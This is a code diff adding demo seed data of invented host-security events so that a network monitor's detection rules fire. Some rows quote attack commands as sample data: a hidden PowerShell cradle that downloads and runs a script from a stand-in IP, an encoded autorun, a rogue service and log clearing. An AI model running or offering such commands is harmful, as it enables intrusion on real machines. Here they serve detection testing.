@@ -34,6 +34,7 @@ like the private network it is meant to monitor. The OUIs are real and public
 from __future__ import annotations
 
 import math
+import json
 import random
 import time
 
@@ -262,14 +263,83 @@ def generate(db: Database, *, days: int = 7, seed: int = 20260824) -> dict:
     # passing one -- an empty panel makes exactly the opposite impression.
     host = _seed_host_facts(db, now)
     ident = _seed_identity(db, now)
+    host_events = _seed_host_events(db, now, created)
 
     return {
+        "host_events": host_events,
         "devices": len(created),
         "availability_samples": len(created) * samples,
         "network": f"{SEED_NETWORK}.0/24",
         "host_facts": host,
         "identity": ident,
     }
+
+
+# --------------------------------------------------------------- host events
+
+def _seed_host_events(db: Database, now: float, created: list[dict]) -> int:
+    """One row of each host-event kind the rules read, plus the two derived
+    signals (an ARP sweep by the Smart Plug, an upload spike), so every rule
+    in `host_event_rules()` demonstrably fires on the demo -- the same
+    contract `test_every_rule_in_the_default_set_produces_an_alert` holds the
+    network rules to. Figures are invented; shapes are what the collector
+    writes."""
+    plug = next((d for d in created if d["label"] == "Smart Plug"), None)
+    t = now - 3 * 3600
+    rows = [
+        ("powershell_block", t + 120, "script block: download_cradle, hidden_window, invoke_expression (412 chars)",
+         {"tags": ["download_cradle", "hidden_window", "invoke_expression"], "level": "Warning", "record": 91011,
+          "excerpt": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.13.7.22/a.ps1')",
+          "techniques": ["T1105", "T1564.003", "T1059.001"]}, "high", "T1105"),
+        ("service_installed", t + 300, "service installed: WinUpdateSvc -> C:\\Users\\Public\\Libraries\\svchost.exe",
+         {"name": "WinUpdateSvc", "path": "C:\\Users\\Public\\Libraries\\svchost.exe", "start": "auto start",
+          "tags": ["user_writable_path"], "record": 5521, "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
+         "high", "T1543.003"),
+        ("autorun_added", t + 310, "autorun added: OneDriveUpdater -> powershell.exe -w hidden -enc SQBFAFgA...",
+         {"where": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "OneDriveUpdater",
+          "command": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "signed": None, "sha256": None,
+          "tags": ["script_host", "obfuscated_or_downloader"]}, "high", "T1547.001"),
+        ("software_installed", t - 1800, "installed: AnyDesk 8.1.0 (philandro Software GmbH)",
+         {"name": "AnyDesk", "version": "8.1.0", "publisher": "philandro Software GmbH",
+          "location": "C:\\Program Files (x86)\\AnyDesk", "tags": ["remote_access"]}, "high", "T1219"),
+        ("hidden_dir_created", t + 290, "hidden directory created: C:\\Users\\Public\\Libraries",
+         {"path": "C:\\Users\\Public\\Libraries", "attributes": "Hidden, System, Directory",
+          "tags": ["user_writable_path", "system_attribute"]}, "medium", "T1564.001"),
+        ("log_cleared", t + 3500, "an event log was cleared: Security", {"props": ["Security"], "record": 5530}, "high", "T1070.001"),
+        ("connection", t + 600, "powershell.exe -> 45.13.7.22:8443 [script_host_network, uncommon_port]",
+         {"raddr": "45.13.7.22", "rport": 8443, "lport": 51422, "pid": 4120, "process": "powershell.exe",
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "tags": ["script_host_network", "uncommon_port"]}, "high", "T1105"),
+        # And one attributed row, so the demo shows the agent's own script is
+        # visible but not alerted on.
+        ("powershell_block", t + 60, "PNMA's own script",
+         {"tags": [], "level": "Warning", "record": 91009, "excerpt": "# pnma-agent  $k = Get-ItemProperty ..."}, None, None),
+    ]
+    n = 0
+    for kind, ts, summary, detail, sev, mitre in rows:
+        if db.record_host_event(kind=kind, ts=ts, summary=summary, detail=detail, severity=sev,
+                                dedup_key=f"seed:{kind}:{int(ts)}", agent_generated=(sev is None),
+                                mitre_id=mitre, sensor_id="host"):
+            n += 1
+    # ARP sweep: every device answered the Smart Plug within a minute.
+    if plug:
+        for i, d in enumerate(created):
+            if d is plug:
+                continue
+            db.execute(
+                "INSERT INTO observations(ts, sensor_id, device_id, mac, ip, source, agent_generated, detail) "
+                "VALUES(?,?,?,?,?,?,0,?)",
+                (now - 1800 + i * 2, "seed", d["device_id"], d["mac"], d["ip"], "passive_arp",
+                 json.dumps({"op": "reply", "hwdst": plug["mac"], "pdst": d["ip"], "solicited_by_agent": False})))
+    # Upload spike: 6h of quiet samples, then 10 minutes at 40x.
+    sent = 0.0
+    for i in range(0, 6 * 3600 + 601, 300):
+        ts = now - 6 * 3600 - 600 + i
+        rate = 20_000.0 if ts < now - 600 else 1_200_000.0
+        sent += rate * 300
+        db.execute("INSERT INTO host_counters(ts, adapter, bytes_sent, bytes_recv) VALUES(?,?,?,?)",
+                   (ts, "Wi-Fi", sent, sent * 3))
+    return n
 
 
 # ---------------------------------------------------------------- host facts
